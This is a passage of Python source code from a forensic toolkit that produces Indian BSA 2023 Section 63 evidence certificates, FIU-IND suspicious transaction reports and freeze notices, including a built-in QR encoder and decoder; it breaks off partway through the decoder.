#!/usr/bin/env python3
"""
SUTRA-Trace · Sector D: Statutory Compliance & BSA 2023 Section 63 Certificate Generator
========================================================================================

Fourth layer of the SUTRA-Trace digital forensics framework (SUTRAM 2026, PS-01). It turns
what Sectors A, B and C proved into the papers a court and a bank act on:

    * the certificate under Section 63(4)(c) of the Bharatiya Sakshya Adhiniyam, 2023, laid
      out as The Schedule: PART A for the person in lawful control or management of the
      device or activities, PART B for the expert (two A4 pages, QR on page 1);
    * an annexure PDF with the hash report the Schedule asks to be enclosed, the Section 45
      grounds (the 14-point intrusion / trojan-defence screen), the Sector C incident
      storyline with byte anchors, and the bad-sector manifest when there is one;
    * an FIU-IND FINnet 2.0 style STR XML (PMLA 2002, Rule 8 of the PML (Maintenance of
      Records) Rules, 2005) for rapid UPI fan-out smurfing and UPI-to-crypto bridges;
    * a debit-freeze notice under Section 106 read with Section 107 BNSS 2023, limited to the
      net tainted balance each account still holds, with an intimation for referral to the
      Directorate of Enforcement under Section 66(2) PMLA 2002 (a Section 17(1A) PMLA freeze
      is the Director's order, never the police's).

Nothing is certified on trust. Before a certificate is drawn, Sector D
    - re-hashes the evidence image (SHA-256, BLAKE2b-512, RFC 6962 Merkle root over 1 KB
      sub-blocks, with Sector A's 0xDEADBEEF fill for known-bad sectors) and the Section 105
      BNSS seizure recording, and recomputes the bound root;
    - runs Sector A's own verifier when Sector A is present (tree hash, master case root,
      custody signatures);
    - recomputes the Sector A, B and C manifest digests and checks that B and C are bound to
      the same Sector A acquisition;
    - re-hashes every byte anchor of Sector B's leads and Sector C's storyline.
Any mismatch makes the certificate NOT_FIT_FOR_FILING, printed on both pages, and the
expert's opinion paragraph says so instead of certifying. Rows that could not be
re-verified (evidence not presented) say exactly that.

Scenario selector (who signs PART A)
    VICTIM_COOPERATIVE   complainant, as owner and lawful user of the device
    SUSPECT_HOSTILE      the Investigating Officer: the device is a seized exhibit produced
                         from proper custody (Section 57, Explanation 5 BSA), seized and
                         recorded under Section 105 BNSS; the accused is never asked to sign
                         (Article 20(3) of the Constitution)
    INTERMEDIARY_NODAL   the bank / telecom Nodal Officer answering a Section 94 BNSS notice
                         (or a Section 69 IT Act direction), records kept in the ordinary
                         course of business

Track selector (statutory codes; the Sector D manual's names are accepted as legacy aliases)
    SEC_57_PRIMARY       (alias TRACK_39_1_DIRECT) the record is the electronic record itself
                         (bit-stream copy proved identical by hash): primary evidence from
                         proper custody, Section 57 Explanations 4 to 7 BSA, with the Section
                         63 certificate in support. Default for VICTIM_COOPERATIVE and
                         SUSPECT_HOSTILE.
    SEC_63_2_OUTPUT      (alias TRACK_39_2_OUTPUT) the record is computer output (logs,
                         exports, statements) admitted under Section 63(1) BSA on the
                         conditions of Section 63(2)(a) to (d). Default for
                         INTERMEDIARY_NODAL. With SUSPECT_HOSTILE the two are kept apart:
                         the seized exhibit stays primary evidence under Section 57
                         Explanation 5, and the Section 63(2) conditions are certified for
                         the forensic workstation that produced the output, never for the
                         accused's device.
    Section 39 BSA itself is the expert-opinion section: PART B cites Section 39(2) when the
    examiner is notified under Section 79A IT Act, Section 39(1) otherwise.

PDF engine
    The built-in pure-Python PDF writer is the default archival engine: deterministic, one
    revision, one %%EOF. reportlab is used only on request (pdf_engine="reportlab"); its
    PDF/A structures are then added as an incremental update. QR codes come from the
    `qrcode` package when installed, else a built-in ISO/IEC 18004 encoder, drawn in pure
    black with each module snapped to whole 300 dpi printer dots. Either way the QR is
    drawn as vector modules (no temp image files) and is decoded back by a built-in decoder
    before it is trusted. PDF/A-1b
    structures (XMP pdfaid, sRGB OutputIntent, file ID) are written only when every font
    is embedded (a TrueType font was found on the machine); otherwise the PDF says that the
    PDF/A claim is withheld. During development both engines' output passed veraPDF 1.28
    (PDF/A-1b profile); this module does not run a validator itself.

Inputs: evidence_manifest.json (Sector A), triage_manifest.json (Sector B),
incident_storyline.json (Sector C). With none given, a built-in demonstration case is used
whose evidence image is generated in memory, so every hash and anchor in it verifies; all
its documents carry a DEMONSTRATION watermark.

Dependencies: Python 3.10+ standard library. Optional: reportlab, qrcode.

Usage
    python sector_d_legal.py [workdir]                  built-in self-test (35 checks + audit
                                                        regression checks)
    python sector_d_legal.py --run --evidence-manifest A.json [--triage-manifest B.json]
           [--storyline C.json] [--evidence-root DIR] [--evidence-path IMG] [--video MP4]
           [--scenario SUSPECT_HOSTILE] [--track SEC_57_PRIMARY] [--strict]
           [--custodian custodian.json] [--expert expert.json] [--out legal_package]
    python sector_d_legal.py --verify-qr '<scanned JSON>' --evidence-manifest A.json
"""

from __future__ import annotations

import base64
import datetime
import enum
import hashlib
import hmac
import importlib.util
import json
import math
import os
import re
import shutil
import struct
import sys
import time
import uuid
import xml.etree.ElementTree as ET
import zlib
from typing import Any, Callable, Dict, Iterable, List, Optional, Sequence, Tuple, Union

try:  # Optional typesetting engine; the built-in writer is used without it.
    if os.environ.get("SUTRA_NO_REPORTLAB"):
        raise ImportError
    from reportlab.pdfgen import canvas as _rl_canvas  # type: ignore
    from reportlab.pdfbase import pdfmetrics as _rl_metrics  # type: ignore
    from reportlab.pdfbase.ttfonts import TTFont as _RLTTFont  # type: ignore
    from reportlab.pdfbase import pdfdoc as _rl_pdfdoc  # type: ignore
    _HAVE_REPORTLAB = True
except Exception:  # pragma: no cover - depends on host
    _rl_canvas = _rl_metrics = _RLTTFont = _rl_pdfdoc = None
    _HAVE_REPORTLAB = False

try:  # Optional QR encoder; the built-in encoder is used without it.
    if os.environ.get("SUTRA_NO_QRCODE"):
        raise ImportError
    import qrcode as _qrcode_lib  # type: ignore
except Exception:  # pragma: no cover - depends on host
    _qrcode_lib = None


# --------------------------------------------------------------------------- #
# Sibling sectors (loaded by path from this folder, never from sys.path)      #
# --------------------------------------------------------------------------- #

def _load_sibling(module_name: str, filename: str):
    """Import prototype/<filename> from this folder, not an older copy elsewhere on sys.path."""
    here = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(here, filename)
    mod = sys.modules.get(module_name)
    if mod is not None and os.path.abspath(getattr(mod, "__file__", "")) == path:
        return mod
    if not os.path.isfile(path):
        return None
    try:
        name = module_name if mod is None else "_sutra_" + module_name
        spec = importlib.util.spec_from_file_location(name, path)
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)  # type: ignore[union-attr]
        return mod
    except Exception:  # pragma: no cover - sibling broken or absent
        return None


_sector_a = _load_sibling("sector_a_vault", "sector_a_vault.py")

LEGAL_VERSION = "SUTRA-LEGAL-2026.3-SUPREME"
LEGAL_REVISION = "r2"
SECTOR_A_MANIFEST = getattr(_sector_a, "MANIFEST_FILENAME", "evidence_manifest.json")
SECTOR_B_MANIFEST = "triage_manifest.json"
STORYLINE_FILENAME = "incident_storyline.json"
CERT_PDF = "BSA_2023_Sec63_Certificate.pdf"
ANNEX_PDF = "BSA_2023_Sec63_Annexures.pdf"
STR_XML = "FIU_IND_STR_FINnet2.xml"
FREEZE_JSON = "BNSS_106_107_Freeze_Notice.json"
FREEZE_TXT = "BNSS_106_107_Freeze_Notice.txt"
QR_PNG = "cert_qr.png"
CERT_JSON = "certificate_data.json"
BUNDLE_MANIFEST = "legal_bundle_manifest.json"
STR_NAMESPACE = "http://fiuindia.gov.in/schema/str"

# Sector A media constants (mirrored so verification works without Sector A loaded)
CHUNK_SIZE = getattr(getattr(_sector_a, "SutraEvidenceVault", None), "CHUNK_SIZE", 4 * 1024 * 1024)
SUB_BLOCK = getattr(getattr(_sector_a, "SutraEvidenceVault", None), "SUB_CHUNK_SIZE", 1024)
SECTOR_SIZE = getattr(getattr(_sector_a, "SutraEvidenceVault", None), "SECTOR_SIZE", 4096)

PALETTE = {
    "navy": "#0E2247", "black": "#000000", "text": "#1E293B", "muted": "#64748B", "cyan": "#00A6FB",
    "border": "#CBD5E1", "light": "#F8FAFC", "emerald": "#065F46", "red": "#991B1B",
    "amber": "#92400E", "white": "#FFFFFF",
}

READY = "READY_FOR_SIGNATURE"
READY_NOTES = "READY_FOR_SIGNATURE_WITH_NOTES"
NOT_FIT = "NOT_FIT_FOR_FILING"

MATCH_EVIDENCE = "MATCH - re-hashed from evidence"
MATCH_RECOMPUTED = "MATCH - recomputed from manifest"
MATCH_SECTOR_A = "MATCH - Sector A verifier"
MISMATCH = "MISMATCH"
RECORDED_ONLY = "RECORDED - not re-verified"
NOT_RECORDED = "NOT RECORDED"

# Statutory citations. The certificate cites the Bharatiya Sakshya Adhiniyam, 2023 only.
BSA = "Bharatiya Sakshya Adhiniyam, 2023"
BNSS = "Bharatiya Nagarik Suraksha Sanhita, 2023"
LAW = {
    "sec63": f"Section 63, {BSA}",
    "sec63_4c": f"Section 63(4)(c), {BSA}",
    "schedule": f"The Schedule to Section 63(4)(c), {BSA}",
    "sec63_2": f"Section 63(2)(a) to (d), {BSA}",
    "sec57_e5": f"Section 57, Explanation 5, {BSA}",
    "sec57_e47": f"Section 57, Explanations 4 to 7, {BSA}",
    "sec39_1": f"Section 39(1), {BSA}",
    "sec39_2": f"Section 39(2), {BSA}",
    "sec45": f"Section 45, {BSA}",
    "bnss94": f"Section 94, {BNSS}",
    "bnss105": f"Section 105, {BNSS}",
    "bnss106": f"Section 106, {BNSS}",
    "bnss107": f"Section 107, {BNSS}",
    "itact79a": "Section 79A, Information Technology Act, 2000",
    "itact69": "Section 69, Information Technology Act, 2000",
    "pmla17_1a": "Section 17(1A), Prevention of Money-laundering Act, 2002",
    "pmla66_2": "Section 66(2), Prevention of Money-laundering Act, 2002",
    "pmla12_rule8": "Section 12, Prevention of Money-laundering Act, 2002 read with Rule 8, "
                    "Prevention of Money-laundering (Maintenance of Records) Rules, 2005",
    "art20_3": "Article 20(3), Constitution of India",
    "selvi": "Selvi v. State of Karnataka, (2010) 7 SCC 263",
    "iso27037": "ISO/IEC 27037:2012",
}

IFSC_BANKS = {
    "YESB": "Yes Bank Ltd", "PYTM": "Paytm Payments Bank Ltd", "UTIB": "Axis Bank Ltd",
    "INDB": "IndusInd Bank Ltd", "HDFC": "HDFC Bank Ltd", "ICIC": "ICICI Bank Ltd",
    "SBIN": "State Bank of India", "KKBK": "Kotak Mahindra Bank Ltd", "PUNB": "Punjab National Bank",
    "BARB": "Bank of Baroda", "CNRB": "Canara Bank", "UBIN": "Union Bank of India",
    "IDIB": "Indian Bank", "AIRP": "Airtel Payments Bank Ltd", "FDRL": "Federal Bank Ltd",
}


class LegalInputError(ValueError):
    """An input manifest is missing, unreadable or not the expected kind."""


# --------------------------------------------------------------------------- #
# Canonical forms and small helpers                                           #
# --------------------------------------------------------------------------- #

def _sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def canonical_json(obj: Any) -> bytes:
    """Sorted keys, compact, NaN/Inf rejected: the byte form Sectors B and C hash."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False,
                      allow_nan=False).encode("utf-8")


def _canon_a(obj: Any) -> Any:
    if isinstance(obj, float):
        if not math.isfinite(obj):
            raise ValueError("NaN/Infinity are not allowed in a canonical manifest")
        return {"$float": repr(obj)}
    if isinstance(obj, dict):
        return {str(k): _canon_a(v) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [_canon_a(v) for v in obj]
    return obj


def canonical_json_a(obj: Any) -> bytes:
    """Sector A's canonical form: as canonical_json, with floats as {"$float": repr}."""
    return json.dumps(_canon_a(obj), sort_keys=True, separators=(",", ":"), ensure_ascii=False,
                      allow_nan=False).encode("utf-8")


IST = datetime.timezone(datetime.timedelta(hours=5, minutes=30), "IST")


def _parse_utc(value: Any) -> Optional[datetime.datetime]:
    if not value or not isinstance(value, str):
        return None
    s = value.strip().replace("Z", "+00:00")
    m = re.match(r"^(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})(\.\d+)?([+-]\d{2}:\d{2})?$", s)
    if not m:
        return None
    frac = (m.group(2) or "")[:7]
    try:
        dt = datetime.datetime.fromisoformat(m.group(1) + frac + (m.group(3) or "+00:00"))
    except ValueError:
        return None
    return dt.astimezone(datetime.timezone.utc)


def _utc_now_iso() -> str:
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _iso_z(dt: datetime.datetime) -> str:
    return dt.astimezone(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def ist_date_time(value: Any) -> Tuple[str, str]:
    """('DD/MM/YYYY', 'HH:MM:SS IST') as The Schedule asks, or placeholders when unknown."""
    dt = _parse_utc(value)
    if dt is None:
        return "__/__/____", "__:__ IST"
    d = dt.astimezone(IST)
    return d.strftime("%d/%m/%Y"), d.strftime("%H:%M:%S IST")


def _fmt_inr(amount: Any) -> str:
    try:
        v = float(amount)
    except (TypeError, ValueError):
        return "INR ?"
    whole, frac = divmod(round(v * 100), 100)
    s = str(int(whole))
    if len(s) > 3:  # Indian digit grouping: 12,34,567
        head, tail = s[:-3], s[-3:]
        head = re.sub(r"(\d)(?=(\d{2})+$)", r"\1,", head)
        s = head + "," + tail
    return f"INR {s}.{int(frac):02d}"


def _is_hex(s: Any, n: Optional[int] = None) -> bool:
    return isinstance(s, str) and bool(re.fullmatch(r"[0-9a-f]+", s)) and (n is None or len(s) == n)


def _bank_for_ifsc(ifsc: Optional[str]) -> str:
    if not ifsc:
        return "Bank not identified (IFSC absent)"
    return IFSC_BANKS.get(ifsc[:4].upper(), f"Bank with IFSC prefix {ifsc[:4].upper()}")


def _audit_key() -> Optional[bytes]:
    k = os.environ.get("SUTRA_AUDIT_KEY")
    return k.encode("utf-8") if k else None


def _load_json_input(value: Any, kind: str) -> Optional[Dict[str, Any]]:
    """dict -> itself; path -> parsed JSON; None -> None. A missing or broken file raises."""
    if value is None:
        return None
    if isinstance(value, dict):
        return value
    if isinstance(value, (str, os.PathLike)):
        path = os.fspath(value)
        if not os.path.isfile(path):
            raise LegalInputError(f"{kind}: file not found: {path}")
        try:
            with open(path, "r", encoding="utf-8") as f:
                doc = json.load(f)
        except (OSError, UnicodeDecodeError, json.JSONDecodeError) as e:
            raise LegalInputError(f"{kind}: cannot parse {path}: {e}") from e
        if not isinstance(doc, dict):
            raise LegalInputError(f"{kind}: {path} is not a JSON object")
        return doc
    raise LegalInputError(f"{kind}: expected a dict or a path, got {type(value).__name__}")


# --------------------------------------------------------------------------- #
# Statutory selectors                                                         #
# --------------------------------------------------------------------------- #

class ScenarioType(enum.Enum):
    """Who is in lawful control or management, and so who signs PART A."""
    VICTIM_COOPERATIVE = "VICTIM_COOPERATIVE"
    SUSPECT_HOSTILE = "SUSPECT_HOSTILE"
    INTERMEDIARY_NODAL = "INTERMEDIARY_NODAL"

    @property
    def part_a_role(self) -> str:
        return {
            "VICTIM_COOPERATIVE": "Complainant / owner and lawful user of the device",
            "SUSPECT_HOSTILE": "Investigating Officer (seizing officer, Sections 105 and 106 BNSS 2023)",
            "INTERMEDIARY_NODAL": "Nodal Officer of the intermediary (bank / telecom service provider)",
        }[self.value]

    @property
    def schedule_relation(self) -> Tuple[str, ...]:
        """Schedule PART A: the source is Owned / Maintained / Managed / Operated by me."""
        return {
            "VICTIM_COOPERATIVE": ("Owned", "Operated"),
            "SUSPECT_HOSTILE": ("Managed",),
            "INTERMEDIARY_NODAL": ("Maintained", "Managed"),
        }[self.value]


class TrackType(enum.Enum):
    """
    Route by which the record is offered, by statutory code. The Sector D manual's names
    TRACK_39_1_DIRECT and TRACK_39_2_OUTPUT are legacy aliases of the two members (Section 39
    BSA is the expert-opinion section and is cited in PART B, not here).
    """
    SEC_57_PRIMARY = "SEC_57_PRIMARY"
    SEC_63_2_OUTPUT = "SEC_63_2_OUTPUT"
    TRACK_39_1_DIRECT = "SEC_57_PRIMARY"     # legacy alias
    TRACK_39_2_OUTPUT = "SEC_63_2_OUTPUT"    # legacy alias

    @property
    def statutory_code(self) -> str:
        return self.value

    @property
    def legacy_alias(self) -> str:
        return {"SEC_57_PRIMARY": "TRACK_39_1_DIRECT", "SEC_63_2_OUTPUT": "TRACK_39_2_OUTPUT"}[self.value]

    @property
    def label(self) -> str:
        return {"SEC_57_PRIMARY": "Direct electronic record (bit-stream copy of the original media)",
                "SEC_63_2_OUTPUT": "Computer output (logs / exports / reports produced by a computer in "
                                   "regular use)"}[self.value]

    @property
    def statutory_route(self) -> str:
        return {"SEC_57_PRIMARY": f"{LAW['sec57_e47']} (primary evidence) with {LAW['sec63']}",
                "SEC_63_2_OUTPUT": f"Section 63(1) and {LAW['sec63_2']}"}[self.value]

    @classmethod
    def default_for(cls, scenario: "ScenarioType") -> "TrackType":
        return cls.SEC_63_2_OUTPUT if scenario == ScenarioType.INTERMEDIARY_NODAL else cls.SEC_57_PRIMARY


def _coerce_enum(value: Any, cls: Any) -> Any:
    if isinstance(value, cls):
        return value
    key = str(value).upper()
    if key in cls.__members__:
        return cls.__members__[key]
    try:
        return cls(key)
    except ValueError as e:
        raise LegalInputError(f"unknown {cls.__name__}: {value!r}; expected one of "
                              f"{', '.join(cls.__members__)}") from e


# --------------------------------------------------------------------------- #
# QR code (ISO/IEC 18004): built-in encoder and a decoder used to check every #
# QR before it is trusted, whichever encoder made it                          #
# --------------------------------------------------------------------------- #

_QR_ECC_PER_BLOCK = {
    "L": (-1, 7, 10, 15, 20, 26, 18, 20, 24, 30, 18, 20, 24, 26, 30, 22, 24, 28, 30, 28, 28, 28, 28, 30, 30, 26, 28,
          30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30),
    "M": (-1, 10, 16, 26, 18, 24, 16, 18, 22, 22, 26, 30, 22, 22, 24, 24, 28, 28, 26, 26, 26, 26, 28, 28, 28, 28, 28,
          28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28),
    "Q": (-1, 13, 22, 18, 26, 18, 24, 18, 22, 20, 24, 28, 26, 24, 20, 30, 24, 28, 28, 26, 30, 28, 30, 30, 30, 30, 28,
          30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30),
    "H": (-1, 17, 28, 22, 16, 22, 28, 26, 26, 24, 28, 24, 28, 22, 24, 24, 30, 28, 28, 26, 28, 30, 24, 30, 30, 30, 30,
          30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30),
}
_QR_NUM_BLOCKS = {
    "L": (-1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 4, 4, 4, 4, 4, 6, 6, 6, 6, 7, 8, 8, 9, 9, 10, 12, 12, 12, 13, 14, 15, 16, 17,
          18, 19, 19, 20, 21, 22, 24, 25),
    "M": (-1, 1, 1, 1, 2, 2, 4, 4, 4, 5, 5, 5, 8, 9, 9, 10, 10, 11, 13, 14, 16, 17, 17, 18, 20, 21, 23, 25, 26, 28, 29,
          31, 33, 35, 37, 38, 40, 43, 45, 47, 49),
    "Q": (-1, 1, 1, 2, 2, 4, 4, 6, 6, 8, 8, 8, 10, 12, 16, 12, 17, 16, 18, 21, 20, 23, 23, 25, 27, 29, 34, 34, 35, 38,
          40, 43, 45, 48, 51, 53, 56, 59, 62, 65, 68),
    "H": (-1, 1, 1, 2, 4, 4, 4, 5, 6, 8, 8, 11, 11, 16, 16, 18, 16, 19, 21, 25, 25, 25, 34, 30, 32, 35, 37, 40, 42, 45,
          48, 51, 54, 57, 60, 63, 66, 70, 74, 77, 81),
}
_QR_ECL_BITS = {"L": 1, "M": 0, "Q": 3, "H": 2}
_QR_ALNUM = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:"


def _gf_mul(x: int, y: int) -> int:
    z = 0
    for i in range(7, -1, -1):
        z = (z << 1) ^ ((z >> 7) * 0x11D)
        z ^= ((y >> i) & 1) * x
    return z & 0xFF


def _rs_divisor(degree: int) -> List[int]:
    result = [0] * (degree - 1) + [1]
    root = 1
    for _ in range(degree):
        for j in range(degree):
            result[j] = _gf_mul(result[j], root)
            if j + 1 < degree:
                result[j] ^= result[j + 1]
        root = _gf_mul(root, 0x02)
    return result


def _rs_remainder(data: Sequence[int], divisor: Sequence[int]) -> List[int]:
    result = [0] * len(divisor)
    for b in data:
        factor = b ^ result.pop(0)
        result.append(0)
        for i, coef in enumerate(divisor):
            result[i] ^= _gf_mul(coef, factor)
    return result


def _qr_raw_modules(ver: int) -> int:
    result = (16 * ver + 128) * ver + 64
    if ver >= 2:
        n = ver // 7 + 2
        result -= (25 * n - 10) * n - 55
        if ver >= 7:
            result -= 36
    return result


def _qr_data_codewords(ver: int, ecl: str) -> int:
    return _qr_raw_modules(ver) // 8 - _QR_ECC_PER_BLOCK[ecl][ver] * _QR_NUM_BLOCKS[ecl][ver]


def _qr_align_positions(ver: int) -> List[int]:
    if ver == 1:
        return []
    n = ver // 7 + 2
    size = ver * 4 + 17
    step = (ver * 8 + n * 3 + 5) // (n * 4 - 4) * 2
    return [6] + sorted(size - 7 - i * step for i in range(n - 1))


def _qr_format_bits(ecl: str, mask: int) -> int:
    data = _QR_ECL_BITS[ecl] << 3 | mask
    rem = data
    for _ in range(10):
        rem = (rem << 1) ^ ((rem >> 9) * 0x537)
    return (data << 10 | rem) ^ 0x5412


def _qr_version_bits(ver: int) -> int:
    rem = ver
    for _ in range(12):
        rem = (rem << 1) ^ ((rem >> 11) * 0x1F25)
    return ver << 12 | rem


def _qr_mask_fn(mask: int) -> Callable[[int, int], bool]:
    return (lambda x, y: (x + y) % 2 == 0, lambda x, y: y % 2 == 0, lambda x, y: x % 3 == 0,
            lambda x, y: (x + y) % 3 == 0, lambda x, y: (x // 3 + y // 2) % 2 == 0,
            lambda x, y: x * y % 2 + x * y % 3 == 0, lambda x, y: (x * y % 2 + x * y % 3) % 2 == 0,
            lambda x, y: ((x + y) % 2 + x * y % 3) % 2 == 0)[mask]


class _QrGrid:
    """Module grid with function-pattern bookkeeping; [y][x] indexing, True = dark."""

    def __init__(self, ver: int):
        self.ver = ver
        self.size = ver * 4 + 17
        self.mod = [[False] * self.size for _ in range(self.size)]
        self.fn = [[False] * self.size for _ in range(self.size)]
        self._draw_function_patterns()

    def _set(self, x: int, y: int, dark: bool) -> None:
        self.mod[y][x] = dark
        self.fn[y][x] = True

    def _draw_function_patterns(self) -> None:
        n = self.size
        for i in range(n):
            self._set(6, i, i % 2 == 0)
            self._set(i, 6, i % 2 == 0)
        for cx, cy in ((3, 3), (n - 4, 3), (3, n - 4)):
            for dy in range(-4, 5):
                for dx in range(-4, 5):
                    xx, yy = cx + dx, cy + dy
                    if 0 <= xx < n and 0 <= yy < n:
                        self._set(xx, yy, max(abs(dx), abs(dy)) not in (2, 4))
        pos = _qr_align_positions(self.ver)
        last = len(pos) - 1
        for i, ax in enumerate(pos):
            for j, ay in enumerate(pos):
                if (i, j) in ((0, 0), (0, last), (last, 0)):
                    continue
                for dy in range(-2, 3):
                    for dx in range(-2, 3):
                        self._set(ax + dx, ay + dy, max(abs(dx), abs(dy)) != 1)
        self.draw_format(0)  # reserve; real bits drawn after masking
        if self.ver >= 7:
            bits = _qr_version_bits(self.ver)
            for i in range(18):
                bit = (bits >> i) & 1 == 1
                a, b = n - 11 + i % 3, i // 3
                self._set(a, b, bit)
                self._set(b, a, bit)

    def draw_format(self, bits: int) -> None:
        n = self.size
        g = lambda i: (bits >> i) & 1 == 1  # noqa: E731
        for i in range(6):
            self._set(8, i, g(i))
        self._set(8, 7, g(6))
        self._set(8, 8, g(7))
        self._set(7, 8, g(8))
        for i in range(9, 15):
            self._set(14 - i, 8, g(i))
        for i in range(8):
            self._set(n - 1 - i, 8, g(i))
        for i in range(8, 15):
            self._set(8, n - 15 + i, g(i))
        self._set(8, n - 8, True)

    def data_positions(self) -> Iterable[Tuple[int, int]]:
        n = self.size
        right = n - 1
        while right >= 1:
            if right == 6:
                right = 5
            for vert in range(n):
                for j in range(2):
                    x = right - j
                    upward = ((right + 1) & 2) == 0
                    y = n - 1 - vert if upward else vert
                    if not self.fn[y][x]:
                        yield x, y
            right -= 2

    def apply_mask(self, mask: int) -> None:
        f = _qr_mask_fn(mask)
        for y in range(self.size):
            for x in range(self.size):
                if not self.fn[y][x] and f(x, y):
                    self.mod[y][x] = not self.mod[y][x]


def _qr_penalty(m: List[List[bool]]) -> int:
    n = len(m)
    score = 0
    pat_a = [True, False, True, True, True, False, True, False, False, False, False]
    pat_b = pat_a[::-1]
    for lines in (m, [list(col) for col in zip(*m)]):
        for row in lines:
            run, prev = 0, None
            for v in row:
                if v == prev:
                    run += 1
                else:
                    if run >= 5:
                        score += 3 + run - 5
                    run, prev = 1, v
            if run >= 5:
                score += 3 + run - 5
            padded = [False] * 4 + row + [False] * 4
            for i in range(len(padded) - 10):
                seg = padded[i:i + 11]
                if seg == pat_a or seg == pat_b:
                    score += 40
    for y in range(n - 1):
        for x in range(n - 1):
            c = m[y][x]
            if c == m[y][x + 1] == m[y + 1][x] == m[y + 1][x + 1]:
                score += 3
    dark = sum(sum(1 for v in row if v) for row in m)
    total = n * n
    k = (abs(dark * 20 - total * 10) + total - 1) // total - 1
    return score + k * 10


def qr_encode(data: bytes, ecl: str = "M", mask: Optional[int] = None, min_version: int = 1) -> List[List[bool]]:
    """Encode bytes in byte mode. Returns the module matrix without quiet zone ([y][x], True = dark)."""
    for ver in range(max(1, min_version), 41):
        cap_bits = _qr_data_codewords(ver, ecl) * 8
        count_bits = 8 if ver <= 9 else 16
        if 4 + count_bits + 8 * len(data) <= cap_bits:
            break
    else:
        raise ValueError(f"payload of {len(data)} bytes does not fit a QR code at ECC {ecl}")
    bits: List[int] = []

    def put(val: int, n: int) -> None:
        bits.extend((val >> i) & 1 for i in range(n - 1, -1, -1))

    put(0b0100, 4)
    put(len(data), count_bits)
    for b in data:
        put(b, 8)
    put(0, min(4, cap_bits - len(bits)))
    put(0, (-len(bits)) % 8)
    pad = 0xEC
    while len(bits) < cap_bits:
        put(pad, 8)
        pad ^= 0xEC ^ 0x11
    codewords = [int("".join(map(str, bits[i:i + 8])), 2) for i in range(0, len(bits), 8)]

    nblocks, ecc_len = _QR_NUM_BLOCKS[ecl][ver], _QR_ECC_PER_BLOCK[ecl][ver]
    raw = _qr_raw_modules(ver) // 8
    n_short = nblocks - raw % nblocks
    short_len = raw // nblocks
    div = _rs_divisor(ecc_len)
    blocks, k = [], 0
    for i in range(nblocks):
        dat = codewords[k:k + short_len - ecc_len + (0 if i < n_short else 1)]
        k += len(dat)
        ecc = _rs_remainder(dat, div)
        if i < n_short:
            dat = dat + [0]
        blocks.append(dat + ecc)
    stream = []
    for i in range(len(blocks[0])):
        for j, blk in enumerate(blocks):
            if i != short_len - ecc_len or j >= n_short:
                stream.append(blk[i])

    best: Optional[Tuple[int, List[List[bool]]]] = None
    for msk in ([mask] if mask is not None else range(8)):
        g = _QrGrid(ver)
        it = iter(g.data_positions())
        total_bits = len(stream) * 8
        for i, (x, y) in enumerate(it):
            g.mod[y][x] = i < total_bits and (stream[i >> 3] >> (7 - (i & 7))) & 1 == 1
        g.apply_mask(msk)
        g.draw_format(_qr_format_bits(ecl, msk))
        pen = _qr_penalty(g.mod)
        if best is None or pen < best[0]:
            best = (pen, [row[:] for row in g.mod])
    assert best is not None
    return best[1]


def qr_decode(matrix: Sequence[Sequence[bool]]) -> bytes:
    """
    Decode a clean module matrix (no quiet zone). Reed-Solomon parity of every block is
    recomputed and must match; this verifies a QR we drew, it is not a camera decoder.
    """
    n = len(matrix)
    if n < 21 or (n - 17) % 4 or any(len(r) != n for r in matrix):
        raise ValueError(f"not a QR module matrix ({n} rows)")
    ver = (n - 17) // 4
    m = [[bool(v) for v in row] for row in matrix]
    f1 = 0
    pos1 = [(8, i) for i in range(6)] + [(8, 7), (8, 8), (7, 8)] + [(14 - i, 8) for i in range(9, 15)]
    for i, (x, y) in enumerate(pos1):
        f1 |= int(m[y][x]) << i
    best = min(((bin(f1 ^ _qr_format_bits(e, k)).count("1"), e, k) for e in "LMQH" for k in range(8)))
    if best[0] > 3:
        raise ValueError("format information unreadable")
    _, ecl, mask = best
    g = _QrGrid(ver)
    fmask = _qr_mask_fn(mask)
    bits = [int(m[y][x] ^ fmask(x, y)) for x, y in g.data_positions()]
    raw = _qr_raw_modules(ver) // 8
    stream = [int("".join(map(str, bits[i * 8:i * 8 + 8])), 2) for i in range(raw)]
    nblocks, ecc_len = _QR_NUM_BLOCKS[ecl][ver], _QR_ECC_PER_BLOCK[ecl][ver]
    n_short = nblocks - raw % nblocks
    short_len = raw // nblocks
    blocks: List[List[int]] = [[] for _ in range(nblocks)]
    idx = 0
    for i in range(short_len + 1):
        for j in range(nblocks):
            if i == short_len - ecc_len and j < n_short:
                continue  # short blocks have no codeword at this index
            if idx < len(stream):
                blocks[j].append(stream[idx])
                idx += 1
    div = _rs_divisor(ecc_len)
    data: List[int] = []
    for j, blk in enumerate(blocks):
        dlen = short_len - ecc_len + (0 if j < n_short else 1)
        dat, ecc = blk[:dlen], blk[dlen:dlen + ecc_len]
        if _rs_remainder(dat, div) != ecc:
            raise ValueError(f"Reed-Solomon parity mismatch in block {j}")
        data.extend(dat)
    bitstr = "".join(f"{b:08b}" for b in data)
    pos, out = 0, bytearray()

    def take(k: int) -> int:
        nonlocal pos
        if pos + k > len(bitstr):
            raise ValueError("truncated QR data")
        v = int(bitstr[pos:pos + k], 2)
        pos += k
        return v

    while pos + 4 <= len(bitstr):
        mode = take(4)
        if mode == 0:
            break
        if mode == 0b0100:
            cnt = take(8 if ver <= 9 else 16)
            out.extend(take(8) for _ in range(cnt))
        elif mode == 0b0010:
            cnt = take(9 if ver <= 9 else 11 if ver <= 26 else 13)
            for _ in range(cnt // 2):
                v = take(11)
                out.extend((_QR_ALNUM[v // 45] + _QR_ALNUM[v % 45]).encode())
